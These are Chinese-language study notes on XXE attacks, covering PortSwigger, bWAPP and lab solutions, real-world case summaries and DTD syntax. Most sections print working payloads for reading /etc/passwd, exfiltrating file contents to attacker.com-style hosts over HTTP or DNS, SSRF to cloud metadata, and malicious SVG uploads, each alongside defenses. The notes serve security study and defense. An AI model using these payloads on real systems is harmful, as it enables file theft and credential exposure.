[TOC]



# 一、知识点

## 一、PortSwigger

### 1. 上传XML点 | file

不需要bp抓包，就能发现XML上传点，然后上传，外部实体（SYSTEM），并且使用file伪协议进行敏感文件读取。

```
<!-- 定义恶意实体读取/etc/passwd -->
<!DOCTYPE foo [  
  <!ENTITY xxe SYSTEM "file:///etc/passwd">  
]>
<data>&xxe;</data>
```

### 2. XXE -> SSRF | HTTP

#### 一、为什么1的不算SSRF

1. SSRF 的核心是：**绕过网络边界**，去请求 **外部或内网资源**；
2. `file://` 协议不走网络栈，它直接访问本地文件系统；
3. 用 `file://` 就完全脱离了这个核心，实战中用处非常有限。

#### 二、案例

✅ 第一步：确认存在 XXE 漏洞

抓包时观察接口参数包含 XML 内容，例如：

```
<test>
  <item>123</item>
</test>
```

尝试注入恶意实体：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/">
]>
<test>
  <item>&xxe;</item>
</test>
```

> 如果服务端回显了内容（如 `latest`），说明 XXE 成功，并且服务端成功访问了目标地址（说明 SSRF 成立）。

### 3. HTTP | Blind XXE

```
<!DOCTYPE stockCheck [  
  <!ENTITY xxe SYSTEM "http://ayct3c5dmrt6dfg1xtjc87rydpji7avz.oastify.com">  
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

引用的 SYSTEM 实体指向的是你自己控制的域名（Burp Collaborator、ceye.io、oastify.com 等）；&xxe; 被嵌入到正常 XML 中，如果服务端解析了这个 XML，就会尝试访问那个 URL。

### 4. 实体参数 | DTD | Blind XXE

#### 一、普通参数和实体参数的区别

| **特性**         | **普通实体（General Entity）**                            | **参数实体（Parameter Entity）**                             |
| :--------------- | :-------------------------------------------------------- | :----------------------------------------------------------- |
| **定义语法**     | `<!ENTITY name "value">` 或 `<!ENTITY name SYSTEM "URI">` | `<!ENTITY % name "value">` 或 `<!ENTITY % name SYSTEM "URI">` |
| **引用方式**     | 在XML文档中用 `&name;` 引用                               | 仅在DTD内部用 `%name;` 引用                                  |
| **作用域**       | 全局（可在XML文档中任意位置使用）                         | 局部（仅在DTD内部生效）                                      |
| **动态拼接能力** | ❌ 静态定义，无法嵌套其他实体                              | ✅ 支持嵌套其他实体，动态构造Payload                          |
| **盲注XXE支持**  | ❌ 无法直接用于无回显场景                                  | ✅ 是盲注XXE的核心技术                                        |

普通参数Blind XXE，只能判断存不存在，不能外带数据。

#### 二、实体参数的优势 | 无回显能外带数据

**(1) 盲注XXE（无回显数据外带）**

- **问题**：当服务器不返回文件内容（如仅返回“成功”或“错误”）时，普通实体无法直接泄露数据。

- **解决方案**：通过参数实体+外部DTD外带数据到攻击者服务器。
  **示例**：

  ```
  <!-- 攻击者托管的恶意DTD（exploit.dtd） -->
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % oob "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?leak=%file;'>">
  %oob;
  %exfil;
  ```

  **流程**：

  1. 参数实体 `%file` 读取文件内容。
  2. 参数实体 `%oob` 动态构造一个外带请求（`%exfil`）。
  3. 最终触发HTTP请求，将数据发送到攻击者服务器。

**(2) 绕过XML解析器的限制**

- **问题**：某些XML解析器（如Java的`DocumentBuilderFactory`）禁止在**内部DTD**中嵌套普通实体或直接引用外部实体。

- **解决方案**：将攻击逻辑移到**外部DTD**中，通过参数实体绕过限制。
  **示例**：

  ```
  <!-- 合法加载外部DTD -->
  <!DOCTYPE foo SYSTEM "http://attacker.com/exploit.dtd">
  ```

  **原因**：

  - 外部DTD的解析规则更宽松，允许参数实体的嵌套和动态计算。

#### 三、题解

##### **步骤1：准备恶意DTD文件**

在攻击者服务器（如Burp Collaborator或自己搭建的HTTP服务）上托管一个恶意DTD文件（如`exploit.dtd`），内容如下：

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % oob "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER/?leak=%file;'>">
%oob;
%exfil;
```

**关键点**：

- `%file`：读取目标服务器的 `/etc/hostname`。
- `%oob`：动态构造一个参数实体 `%exfil`，将文件内容拼接到攻击者URL。
- `%`：是 `%` 的HTML编码，避免XML解析冲突。

##### **步骤2：构造XXE Payload**

在提交的XML中引用外部DTD：

```
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR-SERVER/exploit.dtd">
  %xxe;
]>
<stockCheck><productId>1</productId></stockCheck>
```

**作用**：

1. 加载外部DTD（`exploit.dtd`）。
2. 触发DTD中的参数实体，读取文件并外传数据。

##### **步骤3：捕获外带数据**

检查攻击者服务器的访问日志（或Burp Collaborator），会收到类似请求：

```
http://YOUR-SERVER/?leak=webserver-hostname
```

参数 `leak` 的值即为 `/etc/hostname` 的内容。

### 5. SVG | 内联DTD

**目标**：

	通过上传SVG图片触发XXE，外带 `/etc/hostname` 内容。

**解题步骤**：

1. **构造恶意SVG**（SVG支持内联DTD）：

   ```
   <svg xmlns="http://www.w3.org/2000/svg" width="300" height="300">
      <!ENTITY % file SYSTEM "file:///etc/hostname">
      <!ENTITY % oob "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER/?leak=%file;'>">
      %oob;
      %exfil;
   </svg>
   ```

2. **上传SVG**并监听Burp Collaborator，捕获外带请求。

**关键点**：

- **SVG的XML特性**：允许内联DTD，绕过常规文件上传限制。
- **无需外部DTD**：直接内联参数实体完成攻击。

### 6. 修改**Content-Type** | JSON -> XML

**目标**

当请求头为 `Content-Type: application/json` 时，通过修改为 `application/xml` 触发XXE。

**解题步骤**

1. 拦截JSON请求，修改请求头：

   ```
   Content-Type: application/xml
   ```

2. 插入XXE Payload：

   ```
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <data>&xxe;</data>
   ```

**关键点**

- **Content-Type 切换**：某些后端根据请求头选择解析器，JSON接口可能仍处理XML。
- **漏洞本质**：服务端未严格校验数据格式。

### 7. **协议替代**：`php://filter` 绕过 `file://` 黑名单

1. **基本绕过**：

   ```
   // 当file://被过滤时
   include('php://filter/resource=/etc/passwd');
   ```

2. **Base64编码读取**：

   ```
   // 读取文件内容并以base64编码形式返回
   file_get_contents('php://filter/read=convert.base64-encode/resource=/etc/passwd');
   ```

   返回的内容需要base64解码才能得到原始内容。

3. **使用多种过滤器组合**：

   ```
   // 多重过滤器组合
   include('php://filter/convert.base64-encode|convert.base64-decode/resource=/etc/passwd');
   ```

### 8. XML 包含  | XInclude

**目标**

当XML数据被嵌入到后端文档时，利用XInclude读取文件。

**解题步骤**

1. 在输入中插入XInclude：

   ```
   <foo xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include parse="text" href="file:///etc/passwd"/>
   </foo>
   ```

**关键点**

- **XInclude特性**：允许直接引用外部资源，无需DTD。
- **适用场景**：当无法控制DOCTYPE但能注入XML片段时。

###  9. 内部DTD | 无回显 | HTTP不出网 | DNS外带

**目标**

无HTTP出站时，通过DNS请求泄露数据。

**解题步骤**

1. 构造恶意DTD触发DNS查询：

   ```
   <!DOCTYPE foo [
     <!ENTITY % file SYSTEM "file:///etc/hostname">
     <!ENTITY % oob "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.YOUR-SERVER/'>">
     %oob;
     %exfil;
   ]>
   ```

2. 在DNS日志中查看子域名（如 `webserver.YOUR-SERVER`）。

**关键点**

- **DNS外带**：适用于严格HTTP过滤的环境。
- **数据编码**：将文件内容作为子域名发送。

### 10. 无回显 | 禁用外部DTD | 覆盖内部已知DTD

**目标**

当外部DTD被禁用，利用服务器本地DTD文件触发错误消息泄露数据。

**解题步骤**

1. 查找服务器已知DTD文件（如Linux下的 `/usr/share/yelp/dtd/docbookx.dtd`）。

2. 覆盖其内部实体：

   ```
   <!DOCTYPE foo [
     <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
     <!ENTITY % file SYSTEM "file:///etc/passwd">
     <!ENTITY % ISOamso '
       <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
       %eval;
       %error;
     '>
     %local_dtd;
   ]>
   ```

3. 从错误消息中提取文件内容。

**关键点**

- **本地DTD利用**：通过覆盖预定义实体触发错误回显。
- **适用场景**：无回显且禁用外部DTD时。

### 总结：

| **攻击技术**            | **适用场景**                   | **防御措施**                           | **对应关卡**           |
| :---------------------- | :----------------------------- | :------------------------------------- | :--------------------- |
| **基础文件读取XXE**     | 直接回显文件内容               | 禁用外部实体解析                       | 关卡1-3                |
| **外部DTD盲注XXE**      | 无回显场景，需外带数据         | 禁用外部DTD加载                        | 关卡4                  |
| **SVG内联XXE**          | 文件上传功能（SVG/XML文件）    | 过滤SVG内联DTD或禁用实体               | 关卡5                  |
| **Content-Type切换XXE** | 多格式解析接口（如JSON转XML）  | 严格校验Content-Type与数据一致性       | 关卡6                  |
| **协议黑名单绕过**      | 过滤`file://`等协议            | 禁用所有危险协议（含`php://`等包装器） | 关卡7                  |
| **XInclude攻击**        | XML片段注入（无法控制DOCTYPE） | 禁用XInclude或过滤`xi:include`标签     | 关卡8                  |
| **XXE结合SSRF**         | 内网服务探测或攻击             | 限制服务器出站网络请求                 | 关卡9                  |
| **DNS外带数据**         | 无HTTP出站，需隐蔽泄露         | 监控异常DNS查询                        | 关卡10                 |
| **本地DTD利用**         | 禁用外部DTD且无回显            | 删除/限制敏感本地DTD文件权限           | 关卡11                 |
| **嵌套实体绕过**        | 复杂过滤场景（如WAF）          | 深度检查实体嵌套与编码                 | 扩展场景（非具体关卡） |

## 二、bWAPP

### 1. 基础XXE（Basic）

- **Payload示例**：

  ```
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <data>&xxe;</data>
  ```

- **漏洞原理**：XML解析器未禁用外部实体加载，导致文件读取。

- **防御**：PHP中禁用实体加载或Java中禁用DTD。

### 2. 盲注XXE（Blind OOB）

- **攻击流程**：

  1. 托管恶意DTD（`evil.dtd`）：

     ```
     <!ENTITY % file SYSTEM "file:///etc/hostname">
     <!ENTITY % oob "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?leak=%file;'>">
     %oob; %exfil;
     ```

  2. 目标XML引用外部DTD：

     ```
     <!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
     ```

- **关键点**：参数实体（`%`）动态构造外带请求。

### 3. SVG XXE

- **恶意SVG示例**：

  ```
  <svg xmlns="http://www.w3.org/2000/svg">
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % oob "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?leak=%file;'>">
    %oob; %exfil;
  </svg>
  ```

- **利用场景**：头像上传、图标导入等支持SVG的功能。

### 4. XInclude攻击

- **Payload**：

  ```
  <root xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
  </root>
  ```

- **适用条件**：XML片段注入且无法控制DOCTYPE时。

### 5. 本地DTD利用

- **Payload**：

  ```
  <!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % ISOamso '<!ENTITY &#x25; error SYSTEM "file:///nonexistent/%file;">'>
    %local_dtd;
  ]>
  ```

- **效果**：通过错误消息返回文件内容。

### 总结：

| **关卡名称**                          | **解题思路**                                                 | **关键知识点**                                               | **防御措施**                                                 |
| :------------------------------------ | :----------------------------------------------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- |
| **XML External Entity (XXE) - Basic** | 1. 提交恶意XML读取`/etc/passwd`。 2. 直接回显文件内容。      | - 普通实体（`&xxe;`）直接利用。 - `file://`协议读取本地文件。 | 禁用外部实体解析： `libxml_disable_entity_loader(true);`（PHP） |
| **XXE - Blind (Out-of-Band)**         | 1. 使用参数实体+外部DTD外带数据。 2. 通过HTTP/DNS接收泄露内容。 | - 参数实体（`%param;`）定义。 - 外部DTD动态构造Payload（`%`编码`%`）。 | 禁用外部DTD加载： `setFeature("disallow-doctype-decl", true)`（Java） |
| **XXE - File Upload (SVG)**           | 1. 上传包含恶意DTD的SVG文件。 2. 触发SVG解析泄露数据。       | - SVG是XML格式，支持内联DTD。 - 无需外部DTD即可攻击。        | 过滤SVG中的`<!ENTITY>`或转换为光栅图像（如PNG）。            |
| **XXE - SSRF**                        | 1. 构造XXE访问内网服务（如`http://192.168.1.1`）。 2. 探测或攻击内网资源。 | - XXE触发SSRF，扩展攻击面。 - 结合`http://`或`ftp://`协议。  | 限制服务器出站请求： 防火墙规则+网络隔离。                   |
| **XXE - XInclude**                    | 1. 注入`<xi:include>`标签读取文件。 2. 绕过无DTD控制的场景。 | - XInclude直接引用外部资源（`parse="text"`）。 - 无需完整DOCTYPE声明。 | 禁用XInclude： 过滤`xmlns:xi`命名空间或移除`xi:include`标签。 |
| **XXE - Protocol Wrapping**           | 1. 使用`php://filter`绕过`file://`黑名单。 2. Base64编码文件内容。 | - 协议包装器（`php://`、`zip://`）绕过过滤。 - Base64避免破坏XML结构。 | 白名单允许的协议： 禁用`php://`等危险包装器。                |
| **XXE - Error Based**                 | 1. 利用本地DTD文件触发错误回显。 2. 从错误消息中提取文件内容。 | - 覆盖已知DTD中的实体（如`/usr/share/yelp/dtd/docbookx.dtd`）。 - 错误泄露数据。 | 删除非必要本地DTD文件： 设置文件权限为只读。                 |

## 三、XXE LABS

### 1. 基础文件读取XXE（关卡1-3）

**攻击流程**：

1. **构造恶意XML**：

   ```
   <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <data>&xxe;</data>
   ```

2. **提交请求**：将Payload通过HTTP请求（如POST/GET）发送至目标接口。

3. **回显数据**：服务器解析XML后返回`/etc/passwd`文件内容。

**关键点**：

- **协议支持**：`file://`（本地文件）、`http://`（SSRF）、`expect://`（命令执行，需PHP环境）。
- **依赖条件**：XML解析器启用外部实体且结果回显。

**防御**：

- PHP：`libxml_disable_entity_loader(true);`
- Java：`dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);`

### 2. 盲注XXE（关卡4）

**攻击流程**：

1. **准备恶意DTD**（托管于攻击者服务器`http://attacker.com/exploit.dtd`）：

   ```
   <!ENTITY % file SYSTEM "file:///etc/hostname">
   <!ENTITY % oob "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?leak=%file;'>">
   %oob;
   %exfil;
   ```

   - `%`是`%`的HTML编码，避免解析冲突。

2. **目标XML注入**：

   ```
   <!DOCTYPE foo SYSTEM "http://attacker.com/exploit.dtd">
   <stockCheck>1</stockCheck>
   ```

3. **捕获数据**：攻击者服务器接收请求`http://attacker.com/?leak=webserver-hostname`。

**关键点**：

- **参数实体（`%`）**：仅在DTD内部生效，支持嵌套引用。
- **外部DTD必要性**：绕过某些解析器对内部DTD的限制（如Java默认禁用内部参数实体嵌套）。

**防御**：

- 禁用外部DTD：`setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
- 监控出站HTTP请求。

### 3. SVG XXE（关卡5）

**攻击流程**：

1. **构造恶意SVG**：

   ```
   <svg xmlns="http://www.w3.org/2000/svg">
     <!ENTITY % file SYSTEM "file:///etc/passwd">
     <!ENTITY % oob "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?leak=%file;'>">
     %oob;
     %exfil;
   </svg>
   ```

2. **上传SVG文件**：通过头像上传、图标导入等功能触发解析。

3. **数据外带**：服务器解析SVG时发起HTTP请求泄露数据。

**关键点**：

- **SVG的XML本质**：允许内联DTD，无需外部引用。
- **绕过文件类型检查**：部分系统仅校验文件头（如`<?xml`），未过滤实体。

**防御**：

- 转换SVG为光栅图（如PNG）。
- 过滤SVG中的`<!ENTITY`标签。

### 4. Content-Type切换XXE（关卡6）

**攻击流程**：

1. **拦截请求**：捕获原本的JSON请求（如`{"data":"test"}`）。

2. **修改请求头**：

   ```
   Content-Type: application/xml
   ```

3. **注入XML Payload**：

   ```
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <data>&xxe;</data>
   ```

4. **触发解析**：服务端误按XML处理，返回文件内容。

**关键点**：

- **服务端多解析器**：根据`Content-Type`动态选择JSON/XML解析器。
- **漏洞本质**：缺乏数据格式一致性校验。

**防御**：

- 强制校验数据实际格式（如JSON需符合语法规则）。
- 固定`Content-Type`与数据类型的绑定关系。

### 5. 协议黑名单绕过（关卡7）

**攻击流程**：

1. **尝试被禁协议**：`file://`被过滤时，改用`php://filter`：

   ```
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
   <data>&xxe;</data>
   ```

2. **解码Base64**：获取编码后的文件内容。

**关键点**：

- **PHP包装器**：`php://filter`可读取文件并编码，避免特殊字符破坏XML。
- **其他协议**：`expect://`（需PHP）、`zip://`（压缩包内文件读取）。

**防御**：

- 白名单协议：仅允许`http(s)://`。
- 禁用危险包装器：`allow_url_fopen=Off`（PHP）。

### 6. XInclude攻击（关卡8）

**攻击流程**：

1. **注入XInclude标签**：

   ```
   <root xmlns:xi="http://www.w3.org/2001/XInclude">
     <xi:include parse="text" href="file:///etc/passwd"/>
   </root>
   ```

2. **触发解析**：服务端处理XML时加载外部文件内容。

**关键点**：

- **无需DOCTYPE**：直接通过`xi:include`引用资源。
- **parse="text"**：确保内容以文本形式嵌入。

**防御**：

- 禁用XInclude：移除`xmlns:xi`命名空间或过滤`xi:include`标签。

### 7. XXE结合SSRF（关卡9）

**攻击流程**：

1. **构造内网探测Payload**：

   ```
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:8080/admin">]>
   <data>&xxe;</data>
   ```

2. **分析响应**：根据HTTP状态码或内容判断内网服务存活情况。

**关键点**：

- **协议扩展**：`http://`、`ftp://`、`gopher://`（攻击Redis/MySQL）。
- **端口扫描**：通过响应时间差异判断端口开放状态。

**防御**：

- 网络隔离：限制服务器访问内网。
- 出站防火墙：仅允许必要的外联请求。

### 8. DNS外带数据（关卡10）

**攻击流程**：

1. **构造DNS查询Payload**：

   ```
   <!DOCTYPE foo [
     <!ENTITY % file SYSTEM "file:///etc/hostname">
     <!ENTITY % oob "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.attacker.com/'>">
     %oob;
     %exfil;
   ]>
   ```

2. **监控DNS日志**：接收子域名请求（如`webserver.attacker.com`）。

**关键点**：

- **数据编码**：文件内容需符合域名格式（如去掉特殊字符）。
- **适用场景**：严格HTTP出站限制时。

**防御**：

- DNS监控：告警异常长子域名或高频查询。

### 9. 本地DTD利用（关卡11）

**攻击流程**：

1. **查找已知DTD文件**：如`/usr/share/yelp/dtd/docbookx.dtd`。

2. **覆盖实体触发错误**：

   ```
   <!DOCTYPE foo [
     <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
     <!ENTITY % file SYSTEM "file:///etc/passwd">
     <!ENTITY % ISOamso '<!ENTITY &#x25; error SYSTEM "file:///nonexistent/%file;">'>
     %local_dtd;
   ]>
   ```

3. **从错误消息提取数据**：服务器返回`/nonexistent/root:x:0:0...`等错误。

**关键点**：

- **依赖错误回显**：需服务器显示详细错误信息。
- **已知DTD路径**：不同系统路径可能不同（如Linux/Windows）。

**防御**：

- 关闭错误回显：`display_errors=Off`（PHP）。
- 删除非必要DTD文件。

### 总结：

| **攻击技术**            | **解题思路**                                                 | **关键知识点**                                               | **对应关卡示例** |
| :---------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- | :--------------- |
| **基础文件读取XXE**     | 1. 构造`file://`读取`/etc/passwd`。 2. 直接回显文件内容。    | - 普通实体直接引用（`&xxe;`）。 - 依赖服务器回显。           | 关卡1-3          |
| **盲注XXE（OOB）**      | 1. 使用参数实体+外部DTD外带数据。 2. 通过HTTP/DNS接收泄露内容。 | - 参数实体（`%param;`）动态构造。 - 外部DTD托管攻击者服务器。 | 关卡4            |
| **SVG/图片XXE**         | 1. 上传含恶意DTD的SVG文件。 2. 触发SVG解析泄露数据。         | - SVG是XML格式，支持内联实体。 - 绕过文件上传检查。          | 关卡5            |
| **Content-Type切换XXE** | 1. 修改请求头为`application/xml`。 2. 注入恶意XML。          | - 服务端根据`Content-Type`选择解析器。 - JSON接口可能仍处理XML。 | 关卡6            |
| **协议黑名单绕过**      | 1. 使用`php://filter`或`expect://`替代`file://`。 2. Base64编码文件内容。 | - 协议包装器绕过过滤。 - `php://filter`读取文件需编码。      | 关卡7            |
| **XInclude攻击**        | 1. 注入`<xi:include>`标签读取文件。 2. 绕过无DOCTYPE控制的场景。 | - XInclude独立于DTD。 - 需声明命名空间`xmlns:xi`。           | 关卡8            |
| **XXE结合SSRF**         | 1. 构造`http://内网IP`请求探测内网。 2. 攻击Redis/Jenkins等未授权服务。 | - XXE作为SSRF触发器。 - 扩展内网攻击面。                     | 关卡9            |
| **DNS外带数据**         | 1. 将数据作为子域名发送（如`data.attacker.com`）。 2. 监控DNS日志。 | - 适用于无HTTP出站的环境。 - 数据需编码为合法域名格式。      | 关卡10           |
| **本地DTD利用**         | 1. 覆盖系统DTD中的实体触发错误。 2. 从错误消息提取文件内容。 | - 利用已知本地DTD文件路径。 - 依赖错误回显。                 | 关卡11           |

# 二、案例

### 1. 未禁用外部实体（经典XXE）

#### 技术原理

- **XML结构特征**：

  ```
  <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>  <!-- 定义外部实体 -->
  <ProfileID>&ent;</ProfileID>  <!-- 实体引用触发解析 -->
  ```

- **漏洞触发点**：目标接口（如 `POST /ca/rest/certrequests`）接收未过滤的XML输入。

- **核心缺陷**：XML解析器未禁用DTD（文档类型定义）和外部实体加载功能，导致实体引用可解析本地/远程资源。

#### PoC验证（模拟场景）

```
POST /ca/rest/certrequests HTTP/1.1
Content-Type: application/xml
...
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<CertEnrollmentRequest>
  <ProfileID>&ent;</ProfileID>  <!-- 响应中返回文件内容 -->
</CertEnrollmentRequest>
```

**修复建议**：禁用XML解析器的外部实体处理（如Java中设置 `XMLConstants.FEATURE_SECURE_PROCESSING`）。

------

### 2. Oracle PeopleSoft XXE（CVE-2017-3548）

#### 漏洞机理

- **实体注入结构**：

  ```
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <data>&xxe;</data>
  ```

- **触发条件**：服务端解析XML时未启用安全配置（如未限制 `FEATURE_SECURE_PROCESSING`），允许加载外部实体。

**防御方案**：升级至官方修复版本，强制关闭外部实体解析。

------

### 3. 基于SpellCheck端点的XXE

#### 复现路径

1. **认证与会话**：使用合法凭证登录系统获取Cookie。

2. **构造恶意请求**：

   ```
   POST /Kview/CustomCodeBehind/Base/Utilities/RapidSpellHelpFile.aspx HTTP/1.1
   Host: ███████
   Content-Type: text/xml; charset=UTF-8
   Cookie: [SESSION_COOKIE]
   
   <!DOCTYPE r [<!ENTITY a SYSTEM "file:///c:\Windows\System32\Drivers\etc\hosts">]>
   <r>
     <textToCheck>&a;</textToCheck>  <!-- 返回hosts文件内容 -->
   </r>
   ```

**影响**：可读取服务器本地文件，进一步探测内网信息。

------

### 4. WordPress LIBXML_NOENT配置缺陷

#### 漏洞链分析

1. **文件上传**：上传包含恶意实体的.wav文件：

   ```
   <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <root>&xxe;</root>
   ```

2. **不安全解析**：WordPress使用 `LIBXML_NOENT` 标志解析XML，强制展开实体：

   ```
   $XMLobject = simplexml_load_string($XMLstring, 'SimpleXMLElement', LIBXML_NOENT);
   ```

**修复要点**：避免使用 `LIBXML_NOENT`，或结合实体禁用策略。

------

### 5. Elastic Enterprise Search爬虫XXE

#### 攻击流程

1. **构造恶意sitemap.xml**：

   ```
   <!ENTITY % dtd SYSTEM "http://attacker.com/exfil.dtd">
   %dtd;
   %param1;
   %exfil;
   ```

2. **外部DTD内容**（exfil.dtd）：

   ```
   <!ENTITY % data SYSTEM "file:///etc/hostname">
   <!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/exfil?%data;'>">
   ```

**影响**：Web爬虫解析时泄露服务器敏感数据至攻击者域名。

------

### 6. 反射型XXE（GET参数注入）

#### 利用方式

1. **托管恶意XML**（http://attacker.com/evil.xml）：

   ```
   <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <root>&xxe;</root>
   ```

2. **触发解析**：

   ```
   GET /get_recording_slides_xml.xml?url=http://attacker.com/evil.xml
   ```

**修复方向**：验证输入URL的合法性，禁用外部资源加载。

------

### 7. Hive数据库XXE（SQLI -> GCP元数据泄露）

#### 攻击链复现

1. **利用未授权Hive访问**：直接连接至暴露的数据库端口。

2. **执行XXE查询**：

   ```
   SELECT xpath_string('
     <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/project-id">]>
     <stockCheck>&xxe;</stockCheck>
   ', '*') FROM test;
   ```

**关键风险**：通过云元数据获取服务账户凭证，可能导致云环境沦陷。

------

### 8. SVG类XXE（SSRF/LFI）

#### 攻击向量

- **SSRF Payload**：

  ```
  <svg xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="http://ATTACKER_IP/svg" />
  </svg>
  ```

- **LFI Payload**：

  ```
  <image xlink:href="file:///etc/passwd" />
  ```

**修复策略**：严格限制SVG文件解析逻辑，过滤 `xlink:href` 中的危险协议。

------

### 9. JPEG XMP元数据XXE

#### 利用步骤

1. **嵌入恶意XMP**：

   ```
   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER.COM/x.dtd"> %xxe;]
   ```

2. **外带数据DTD**：

   ```
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER.COM/?leak=%file;'>">
   ```

**防御方案**：处理图像元数据时禁用实体解析，使用安全解析库。

------

### 10. 文件上传功能XXE

#### 漏洞复现关键

1. **绕过文件类型检查**：修改 `allow_file_type_list` 参数上传.xml文件。
2. **强制解析XML**：通过参数（如 `_hxpage`）触发服务端解析流程。

**安全建议**：实施严格的文件内容校验，避免动态解析用户可控文件。

------

### 11. XXE至RCE（Axis服务滥用）

#### 攻击路径

1. **利用XXE探测路径**：读取服务器文件确定Web根目录。

2. **部署恶意JSP**：通过Axis管理接口上传Webshell：

   ```
   <deployment xmlns="http://xml.apache.org/axis/wsdd/">
     <service name="MaliciousService" provider="java:RPC">
       <parameter name="className" value="Malicious"/>
       <parameter name="allowedMethods" value="*"/>
     </service>
   </deployment>
   ```

**深度防御**：关闭不必要的远程部署接口，限制文件系统权限。

------

### 防御体系总结

| 防御层级       | 具体措施                                                 |
| :------------- | :------------------------------------------------------- |
| **代码层**     | 禁用DTD、设置 `FEATURE_SECURE_PROCESSING`、使用SAX解析器 |
| **配置层**     | 升级XML库版本、限制外部网络访问、配置云元数据访问权限    |
| **文件处理**   | 校验文件类型与内容、使用专用图像处理库、隔离解析环境     |
| **网络层**     | 防火墙限制元数据服务访问、监控异常外联请求               |
| **日志与监控** | 记录XML解析错误、审计异常文件上传行为                    |

# 三、总结

## xml-DTD语法：

##### 什么是dtd、实体:

```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

1. []里面的所有内容都叫dtd
2. 里面的每个entity叫实体

##### 普通参数、实体参数的区别：

1. 普通参数可以用于显示/读取内容，实体参数不能

2. 普通参数能在xml内部引用、dtd内部声明嵌套使用、实体参数只能在dtd内部引用

3. 普通参数、实体参数都能用与内部实体与外部实体

4. 嵌套：

   | 实体类型 A ➝ 实体类型 B | A 能嵌套 B? | 说明                                   |
   | ----------------------- | ----------- | -------------------------------------- |
   | 参数实体 ➝ 参数实体     | ✅           | 可在**外部子集**内嵌套，构建复杂 DTD。 |
   | 参数实体 ➝ 普通实体     | ✅           | 可定义普通实体。                       |
   | 普通实体 ➝ 参数实体     | ❌           | 参数实体不能出现在普通实体值里。       |
   | 普通实体 ➝ 普通实体     | ✅           | 可递归定义，如 “Billion Laughs”。      |

##### 内部实体、外部实体：

1. 内部实体没有SYSTEM，外部实体有
2. 内部实体只能进行字符串替换，外部实体可以加载http请求，加载外部dtd

##### 外部dtd与内部dtd的区别：

1. 外部dtd能够嵌套+解析参数实体，内部dtd不能内部嵌套+解析（但是可以**内部嵌套，外部解析**）

   ```
   <!DOCTYPE message [
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
   %eval;
   %exfil;
   ]>
   1. 如果在内部dtd中直接报错
   ```

   ```
   <!DOCTYPE message [
   <!ENTITY % shell '
   <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
   <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; exfil SYSTEM &#x27;file:///invalid/&#x25;file;&#x27;>">
   &#x25;eval;
   &#x25;exfil;
   '>
   %shell;
   ]>
   1. 如果加%shell，在内部dtd中不报错，因为还没有展开解析%shell
   2. 如果是在外部的dtd中加载%shell，也不会报错
   ```

   ```
   <!DOCTYPE message [
   <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
   <!ENTITY % ISOamso '
   <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
   <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
   &#x25;eval;
   &#x25;error;
   '>
   %local_dtd;
   ]>
